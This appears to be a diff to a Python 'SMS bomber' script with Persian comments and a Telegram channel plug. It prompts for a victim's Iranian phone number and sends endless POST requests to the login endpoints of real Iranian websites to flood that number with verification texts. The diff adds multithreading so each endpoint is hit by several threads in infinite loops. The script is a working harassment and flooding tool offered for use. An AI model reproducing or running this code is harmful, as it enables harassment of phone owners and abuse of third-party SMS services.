@@ -1,5 +1,7 @@
 import requests
 import os
+import threading
+import time
 
 red='\033[31m'
 green='\033[32m'
@@ -37,12 +39,22 @@ urls = [
     "https://takshopaccessorise.ir/api/v1/sessions/login_request"
 ]
 
+# تعیین تنظیمات پیکربندی
+phone_number = input("Enter phone Number (9++++++) : ")
+num_threads = 5  # تعداد نخ‌ها
+interval = 1  # زمان انتظار بین هر ارسال (ثانیه)
+
+# تابع برای ارسال درخواست به URL
+def send_request(url):
+    while True:
+        try:
+            response = requests.post(url, data={"cellphone": "+98" + phone_number})
+            print(f"Sent to {url}, status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error sending to {url}: {e}")
+
 # پاک کردن صفحه کنسول
 os.system("clear")
-# نصب پکیج figlet
-os.system("pkg install figlet -y")
-os.system("clear")
-
 # چاپ عنوان با رنگ قرمز
 print(f"{red} ")
 os.system("figlet sms bomber")
@@ -50,22 +62,18 @@ print(f"{green}===========================================")
 print("  telegram channel: @VPN_Alexabot            ")
 print(f"{green}===========================================")
 
-# چاپ منوی انتخابی
-print("[1]start")
-print("[2]exit")
+# ایجاد و شروع نخ‌ها
+threads = []
+for i in range(num_threads):
+    for url in urls:
+        t = threading.Thread(target=send_request, args=(url,))
+        t.start()
+        threads.append(t)
+    time.sleep(interval)  # انتظار برای فراخوانی بعدی
 
-# دریافت انتخاب کاربر
-king = int(input("[~]Bad_boy==>"))
+# انتظار برای پایان همه نخ‌ها
+for t in threads:
+    t.join()
 
-# اگر کاربر گزینه start را انتخاب کند
-if king == 1:
-    hacker = input("Enter phone Number (9++++++) : ")
-    while True:
-        for url in urls:
-            # ارسال درخواست POST به هر URL
-            requests.post(url, data={"cellphone": "+98" + hacker})
-            print("sended to =>", hacker)
-# اگر کاربر گزینه exit را انتخاب کند
-elif king == 2:
-    os.system("clear")
-    print("have nice day =) ")
+# اتمام برنامه
+print("Done!")
